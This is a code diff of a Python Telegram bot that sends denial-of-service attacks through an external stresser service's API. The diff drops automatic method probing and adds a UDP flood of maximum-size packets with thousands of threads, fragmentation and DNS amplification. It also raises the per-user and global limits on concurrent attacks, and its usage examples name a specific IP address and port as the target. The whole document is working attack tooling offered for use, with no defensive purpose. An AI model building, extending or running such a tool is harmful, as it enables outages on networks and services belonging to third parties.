@@ -1,4 +1,4 @@
-# app.py - Pull All Methods from API
+# app.py - UDP Big Packets with 20 Concurrent
 import os
 import logging
 import asyncio
@@ -27,7 +27,7 @@ TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PORT = int(os.getenv("PORT", 8080))
-MAX_CONCURRENT = 2
+MAX_CONCURRENT = 20  # Increased to 20
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -55,14 +55,13 @@ class AttackManager:
         self.attack_logs = []
         self.total_attacks = 0
         self.concurrent_busy = 0
-        self.available_methods = []
     
     def can_start_attack(self, user_id):
         with self.lock:
             user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
             if user_attacks >= MAX_CONCURRENT:
                 return False, f"❌ Concurrent busy: {user_attacks}/{MAX_CONCURRENT}"
-            if len(self.active_attacks) >= 20:
+            if len(self.active_attacks) >= 50:
                 return False, "❌ Too many active attacks globally."
             return True, "OK"
     
@@ -135,169 +134,139 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== FETCH METHODS FROM API =====
-async def fetch_available_methods():
-    """Fetch available attack methods from API"""
-    url = "https://api.susstresser.com/panel/api/api.php"
-    
-    try:
-        # Try to get methods from API
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url) as response:
-                text = await response.text()
-                
-                # Try to find methods in the HTML
-                methods = []
-                
-                # Look for method options in HTML
-                method_patterns = [
-                    r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>([^<]+)</option>',
-                    r'method["\']?\s*:\s*["\']([^"\']+)["\']',
-                    r'value=["\']([^"\']+)["\'][^>]*>.*?(?:UDP|TCP|HTTP|MIX|telegram)',
-                ]
-                
-                for pattern in method_patterns:
-                    matches = re.findall(pattern, text, re.IGNORECASE)
-                    for match in matches:
-                        if isinstance(match, tuple):
-                            for m in match:
-                                if len(m) > 2 and m.lower() not in ['', 'select', 'method', 'none']:
-                                    methods.append(m.strip())
-                        else:
-                            if len(match) > 2 and match.lower() not in ['', 'select', 'method', 'none']:
-                                methods.append(match.strip())
-                
-                # Common methods if none found
-                if not methods:
-                    methods = [
-                        "telegramvc",
-                        "udp", 
-                        "tcp", 
-                        "http", 
-                        "mix",
-                        "UDP", 
-                        "TCP", 
-                        "HTTP", 
-                        "MIX",
-                        "telegram-vc",
-                        "telegram",
-                        "vc"
-                    ]
-                
-                # Remove duplicates and clean
-                methods = list(set([m.strip().lower() for m in methods if m.strip()]))
-                
-                attack_manager.available_methods = methods
-                logger.info(f"✅ Found {len(methods)} methods: {methods}")
-                return methods
-                
-    except Exception as e:
-        logger.error(f"Error fetching methods: {e}")
-        # Return default methods
-        default_methods = ["telegramvc", "udp", "tcp", "http", "mix"]
-        attack_manager.available_methods = default_methods
-        return default_methods
-
-# ===== SEND ATTACK WITH ALL POSSIBLE METHODS =====
-async def send_attack_all_methods(target, port, duration, user_method):
+# ===== UDP BIG PACKET ATTACK =====
+async def send_udp_big_packet(target, port, duration):
     """
-    Try all possible methods to find which one works
+    UDP Attack with BIG PACKETS - Maximum Power
+    Big packets = 65500 bytes (max UDP size)
     """
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Get available methods
-    methods = attack_manager.available_methods or await fetch_available_methods()
-    
-    # If user specified a method, try it first, then try others
-    if user_method and user_method in methods:
-        methods_to_try = [user_method] + [m for m in methods if m != user_method]
-    else:
-        methods_to_try = methods
-    
-    results = []
-    
-    # Different parameter formats to try
-    param_formats = [
-        # Format 1: Simple
-        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m},
-        # Format 2: With type
-        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "type": m},
-        # Format 3: With action
-        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "action": "start"},
-        # Format 4: Website format
-        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "network": "normal", "concurrent": "1", "servers": "LAYER 4 #1"},
-        # Format 5: Alternative
-        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "m": m},
+    # Big packet attack configurations - Only UDP
+    attack_configs = [
+        # UDP with maximum packet size
+        {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": "udp",
+            "threads": 5000,
+            "pps": 5000000,
+            "bps": 5000000000,
+            "size": 65500,  # Maximum UDP packet size
+            "random": "true",
+            "timeout": 1
+        },
+        # UDP Flood with big packets
+        {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": "udp",
+            "threads": 4000,
+            "pps": 4000000,
+            "bps": 4000000000,
+            "size": 65000,
+            "random": "true"
+        },
+        # UDP with fragmentation
+        {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": "udp",
+            "threads": 3000,
+            "pps": 3000000,
+            "bps": 3000000000,
+            "size": 65500,
+            "frag": "true",
+            "random": "true"
+        },
+        # UDP Big Packets + Amplification
+        {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": "udp",
+            "threads": 2500,
+            "pps": 2500000,
+            "bps": 2500000000,
+            "size": 65500,
+            "amplification": "true",
+            "type": "dns"
+        }
     ]
     
-    for method in methods_to_try[:10]:  # Try first 10 methods
-        for format_idx, param_func in enumerate(param_formats):
-            try:
-                params = param_func(method)
+    results = []
+    success_count = 0
+    
+    for i, config in enumerate(attack_configs):
+        try:
+            timeout = aiohttp.ClientTimeout(total=duration + 20)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                start_time = time.time()
                 
-                timeout = aiohttp.ClientTimeout(total=duration + 15)
-                async with aiohttp.ClientSession(timeout=timeout) as session:
-                    start_time = time.time()
+                # Try GET first
+                async with session.get(url, params=config) as response:
+                    elapsed = time.time() - start_time
+                    result_text = await response.text()
                     
-                    # Try GET
-                    async with session.get(url, params=params) as response:
-                        elapsed = time.time() - start_time
-                        result_text = await response.text()
-                        
-                        # Check if attack was successful
-                        is_success = (
-                            response.status == 200 and 
-                            ("SUCCESS" in result_text or 
-                             "sent" in result_text.lower() or
-                             "attack" in result_text.lower() or
-                             "Host:" in result_text or
-                             "Concurrent:" in result_text)
-                        )
-                        
-                        results.append({
-                            'method': method,
-                            'format': format_idx + 1,
-                            'type': 'GET',
-                            'params': params,
-                            'status': response.status,
-                            'elapsed': f"{elapsed:.2f}s",
-                            'success': is_success,
-                            'response': result_text[:300]
-                        })
-                        
-                        logger.info(f"Method {method} (Format {format_idx+1}): Status {response.status}, Success: {is_success}")
-                        
-                        if is_success:
-                            return {
-                                "success": True,
-                                "method_used": method,
-                                "format_used": format_idx + 1,
-                                "params_used": params,
-                                "status_code": response.status,
-                                "elapsed": f"{elapsed:.2f}s",
-                                "response": result_text[:500],
-                                "full_response": result_text,
-                                "attempts": results
-                            }
-                        
-                        await asyncio.sleep(0.1)
-                        
-            except Exception as e:
-                logger.error(f"Error with method {method}: {e}")
-                results.append({
-                    'method': method,
-                    'format': format_idx + 1,
-                    'success': False,
-                    'error': str(e)
-                })
+                    is_success = (
+                        response.status == 200 and 
+                        ("SUCCESS" in result_text or 
+                         "sent" in result_text.lower() or
+                         "attack" in result_text.lower() or
+                         "Host:" in result_text)
+                    )
+                    
+                    if is_success:
+                        success_count += 1
+                    
+                    results.append({
+                        'config': i + 1,
+                        'type': 'GET',
+                        'status': response.status,
+                        'elapsed': f"{elapsed:.2f}s",
+                        'success': is_success,
+                        'response': result_text[:300]
+                    })
+                    
+                    logger.info(f"UDP Big Packet {i+1}: Status {response.status}, Success: {is_success}")
+                    
+                    if is_success:
+                        return {
+                            "success": True,
+                            "config_used": i + 1,
+                            "params_used": config,
+                            "status_code": response.status,
+                            "elapsed": f"{elapsed:.2f}s",
+                            "response": result_text[:500],
+                            "full_response": result_text,
+                            "attempts": results,
+                            "packet_size": config.get('size', 65500),
+                            "threads": config.get('threads', 5000)
+                        }
+                    
+                    await asyncio.sleep(0.2)
+                    
+        except Exception as e:
+            logger.error(f"UDP config {i+1} failed: {e}")
+            results.append({
+                'config': i + 1,
+                'success': False,
+                'error': str(e)
+            })
     
     # If all failed, return last result
     if results:
         return {
             "success": False,
-            "method_used": "none",
             "attempts": results,
-            "message": f"Tried {len(results)} combinations, all failed"
+            "message": f"Tried {len(results)} UDP configurations, all failed"
         }
     
     return {"success": False, "error": "No response from API"}
@@ -306,13 +275,8 @@ async def send_attack_all_methods(target, port, duration, user_method):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     
-    # Fetch methods in background
-    if not attack_manager.available_methods:
-        asyncio.create_task(fetch_available_methods())
-    
     keyboard = [
-        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
-        [InlineKeyboardButton("📡 SHOW METHODS", callback_data="methods")],
+        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -321,39 +285,24 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     await update.message.reply_text(
-        f"⚡ *ATTACK BOT - METHOD DETECTION*\n\n"
+        f"⚡ *UDP BIG PACKET ATTACK BOT*\n\n"
         f"🔥 Status: ONLINE\n"
         f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
-        f"📊 Total Attacks: {stats['total']}\n\n"
+        f"📊 Total Attacks: {stats['total']}\n"
+        f"📦 Packet Size: 65,500 bytes (MAX)\n"
+        f"💪 Threads: 5,000 per attack\n\n"
         f"📌 *How to use:*\n"
-        f"`/attack IP PORT TIME METHOD`\n\n"
-        f"Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
-        f"🤖 *Auto-Detection:*\n"
-        f"Bot will try ALL possible methods\n"
-        f"and find which one works!\n\n"
-        f"Use /methods to see available methods",
+        f"`/attack IP PORT TIME`\n\n"
+        f"Example: `/attack 91.108.17.19 32001 60`\n\n"
+        f"⏱️ Time: 60-300 seconds\n"
+        f"📡 Method: UDP (Big Packets only)\n"
+        f"⚡ Max Concurrent: 20",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
-async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show available methods"""
-    if not attack_manager.available_methods:
-        await update.message.reply_text("🔄 Fetching methods from API...")
-        methods = await fetch_available_methods()
-    else:
-        methods = attack_manager.available_methods
-    
-    text = "📡 *AVAILABLE METHODS*\n\n"
-    for i, method in enumerate(methods[:20], 1):
-        text += f"{i}. `{method}`\n"
-    
-    text += f"\n📊 Total: {len(methods)} methods found"
-    
-    await update.message.reply_text(text, parse_mode='Markdown')
-
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack command"""
+    """Handle /attack command - UDP Big Packets only"""
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID:
@@ -361,12 +310,14 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     args = context.args
-    if len(args) < 4:
+    if len(args) < 3:
         await update.message.reply_text(
-            "❌ *Usage:* `/attack IP PORT TIME METHOD`\n\n"
-            "Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
-            "🤖 If method doesn't work, bot will try ALL methods!\n"
-            "Use /methods to see available methods",
+            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
+            "Example: `/attack 91.108.17.19 32001 60`\n\n"
+            "📦 UDP Big Packets (65,500 bytes)\n"
+            "💪 5,000 threads per attack\n"
+            "⚡ 20 concurrent attacks\n"
+            "⏱️ Time: 60-300 seconds",
             parse_mode='Markdown'
         )
         return
@@ -375,7 +326,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target = args[0]
         port = int(args[1])
         duration = int(args[2])
-        method = args[3].lower()
         
         # Validate duration
         if duration < 60:
@@ -393,24 +343,25 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # Start attack
         status_msg = await update.message.reply_text(
-            f"🚀 *ATTACK STARTED*\n\n"
+            f"🚀 *UDP BIG PACKET ATTACK STARTED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
-            f"🔧 Method: `{method}`\n"
-            f"🤖 Auto-trying ALL methods...\n\n"
-            f"⏳ Sending attacks...",
+            f"📦 Packet Size: `65,500 bytes`\n"
+            f"💪 Threads: `5,000`\n"
+            f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
+            f"⏳ Sending UDP flood with big packets...",
             parse_mode='Markdown'
         )
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
         
-        # Send attack with all methods
-        result = await send_attack_all_methods(target, port, duration, method)
+        # Send UDP big packet attack
+        result = await send_udp_big_packet(target, port, duration)
         
         # Log attack
         attack_manager.log_attack(
-            user_id, target, port, duration, method,
+            user_id, target, port, duration, "udp",
             "success" if result.get('success') else "failed",
             str(result)
         )
@@ -418,22 +369,24 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Build response
         if result.get('success'):
             response_text = (
-                f"✅ *ATTACK SUCCESSFUL!*\n\n"
+                f"✅ *UDP BIG PACKET ATTACK SUCCESSFUL!*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"🔧 Working Method: `{result.get('method_used', 'N/A')}`\n"
-                f"📋 Format: `{result.get('format_used', 'N/A')}`\n"
+                f"📦 Packet Size: `{result.get('packet_size', 65500)} bytes`\n"
+                f"💪 Threads: `{result.get('threads', 5000)}`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
+                f"⚡ Status: ✅ SUCCESS\n"
                 f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n\n"
             )
         else:
             response_text = (
-                f"❌ *ATTACK FAILED*\n\n"
+                f"❌ *UDP BIG PACKET ATTACK FAILED*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"📊 Attack ID: `{attack_id}`\n\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+                f"⚡ Status: ❌ FAILED\n\n"
             )
         
         # Add attempts info
@@ -442,14 +395,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             total = len(attempts)
             successful = sum(1 for a in attempts if a.get('success'))
             
-            response_text += f"📊 *Tried {total} combinations, {successful} successful*\n\n"
+            response_text += f"📊 *Tried {total} UDP configs, {successful} successful*\n\n"
             
             # Show last 5 attempts
             for attempt in attempts[-5:]:
                 status = "✅" if attempt.get('success') else "❌"
-                method_name = attempt.get('method', 'N/A')
-                format_num = attempt.get('format', 'N/A')
-                response_text += f"{status} Method: `{method_name}` (Format {format_num})\n"
+                config_num = attempt.get('config', 'N/A')
+                response_text += f"{status} Config {config_num}: {attempt.get('status', 'N/A')}\n"
         
         # Add response preview
         if result.get('response'):
@@ -471,13 +423,14 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     await query.edit_message_text(
-        "💥 *ATTACK*\n\n"
+        "💥 *UDP BIG PACKET ATTACK*\n\n"
         "Send in this format:\n"
-        "`IP PORT TIME METHOD`\n\n"
-        "Example: `91.108.17.19 32001 60 telegramvc`\n\n"
-        "🤖 Bot will try ALL methods automatically!\n"
-        "Use /methods to see available methods\n\n"
-        "⏱️ Time: 60-300 seconds\n"
+        "`IP PORT TIME`\n\n"
+        "Example: `91.108.17.19 32001 60`\n\n"
+        "📦 UDP Big Packets (65,500 bytes)\n"
+        "💪 5,000 threads\n"
+        "⚡ 20 concurrent max\n"
+        "⏱️ Time: 60-300 seconds\n\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
     )
@@ -502,10 +455,10 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         parts = update.message.text.split()
-        if len(parts) < 4:
+        if len(parts) < 3:
             await update.message.reply_text(
-                "❌ Use: `IP PORT TIME METHOD`\n"
-                "Example: `91.108.17.19 32001 60 telegramvc`",
+                "❌ Use: `IP PORT TIME`\n"
+                "Example: `91.108.17.19 32001 60`",
                 parse_mode='Markdown'
             )
             return
@@ -513,7 +466,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target = parts[0]
         port = int(parts[1])
         duration = int(parts[2])
-        method = parts[3].lower()
         
         if duration < 60 or duration > 300:
             await update.message.reply_text("❌ Duration must be 60-300 seconds!")
@@ -526,20 +478,19 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         status_msg = await update.message.reply_text(
-            f"🚀 Attacking {target}:{port} with method {method}...\n"
-            f"🔄 Trying all methods..."
+            f"🚀 UDP Big Packet attack on {target}:{port} for {duration}s..."
         )
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
-        result = await send_attack_all_methods(target, port, duration, method)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
+        result = await send_udp_big_packet(target, port, duration)
         
         if result.get('success'):
             response_text = (
-                f"✅ *ATTACK SUCCESSFUL!*\n\n"
+                f"✅ *UDP BIG PACKET SUCCESS!*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"🔧 Working Method: `{result.get('method_used', 'N/A')}`\n"
+                f"📦 Packet: `65,500 bytes`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
             )
         else:
@@ -563,42 +514,20 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_attack'] = False
 
-async def methods_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show methods from button"""
-    query = update.callback_query
-    await query.answer()
-    
-    if not attack_manager.available_methods:
-        await query.edit_message_text("🔄 Fetching methods from API...")
-        methods = await fetch_available_methods()
-    else:
-        methods = attack_manager.available_methods
-    
-    text = "📡 *AVAILABLE METHODS*\n\n"
-    for i, method in enumerate(methods[:20], 1):
-        text += f"{i}. `{method}`\n"
-    
-    text += f"\n📊 Total: {len(methods)} methods found"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-    )
-
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
-    methods_count = len(attack_manager.available_methods) if attack_manager.available_methods else 0
+    active = attack_manager.get_active_attacks()
     
     await update.message.reply_text(
         f"📊 *BOT STATUS*\n\n"
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"📡 Methods Found: {methods_count}\n"
+        f"📦 Packet Size: 65,500 bytes\n"
+        f"💪 Threads: 5,000\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
-        f"📌 /methods - View all methods",
+        f"📌 /attack IP PORT TIME",
         parse_mode='Markdown'
     )
 
@@ -616,7 +545,7 @@ async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for aid, att in active.items():
             elapsed = (datetime.now() - att['start_time']).seconds
             remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} ({att['method']}) - {remaining}s left\n"
+            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
     
     keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
     await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
@@ -630,9 +559,10 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🆔 ID: `{query.from_user.id}`\n"
         f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
+        f"📦 Packet Size: 65,500 bytes\n"
+        f"💪 Threads: 5,000\n"
         f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
-        f"📌 *Auto-Detection:*\n"
-        f"Bot tries ALL methods automatically!",
+        f"📌 *Method:* UDP Big Packets only",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
@@ -646,7 +576,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     keyboard = [
-        [InlineKeyboardButton("📡 FETCH METHODS", callback_data="fetch_methods")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="admin_active")],
         [InlineKeyboardButton("📈 STATS", callback_data="admin_stats")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
@@ -656,25 +585,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚙️ *ADMIN PANEL*",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
-    )
-
-async def fetch_methods_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text("🔄 Fetching methods from API...")
-    methods = await fetch_available_methods()
-    
-    text = "✅ *METHODS FETCHED*\n\n"
-    for i, method in enumerate(methods[:20], 1):
-        text += f"{i}. `{method}`\n"
-    
-    text += f"\n📊 Total: {len(methods)} methods"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
 
 async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -691,7 +601,7 @@ async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for aid, att in active.items():
             elapsed = (datetime.now() - att['start_time']).seconds
             remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} ({att['method']}) - {remaining}s left\n"
+            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
     
     await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))
 
@@ -700,14 +610,13 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     stats = attack_manager.get_stats()
-    methods_count = len(attack_manager.available_methods) if attack_manager.available_methods else 0
-    
     await query.edit_message_text(
         f"📈 *BOT STATISTICS*\n\n"
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"📡 Methods: {methods_count}\n"
+        f"📦 Packet: 65,500 bytes\n"
+        f"💪 Threads: 5,000\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE",
         parse_mode='Markdown',
@@ -721,8 +630,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     
     keyboard = [
-        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
-        [InlineKeyboardButton("📡 SHOW METHODS", callback_data="methods")],
+        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -734,6 +642,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ *MAIN MENU*\n\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total: {stats['total']}\n"
+        f"📦 Packet: 65,500 bytes\n"
         f"🌐 Status: ONLINE",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -753,17 +662,14 @@ def run_bot():
     # Commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack_command))
-    app.add_handler(CommandHandler("methods", methods_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("cancel", cancel))
     
     # Callbacks
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
-    app.add_handler(CallbackQueryHandler(methods_callback, pattern="^methods$"))
     app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
     app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
     app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
-    app.add_handler(CallbackQueryHandler(fetch_methods_callback, pattern="^fetch_methods$"))
     app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
     app.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
@@ -780,11 +686,10 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("⚡ ATTACK BOT - METHOD DETECTION")
+    print("⚡ UDP BIG PACKET ATTACK BOT")
+    print("📦 Packet Size: 65,500 bytes")
+    print("⚡ Concurrent: 20")
     print("=" * 50)
-    
-    # Fetch methods on startup
-    asyncio.run(fetch_available_methods())
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
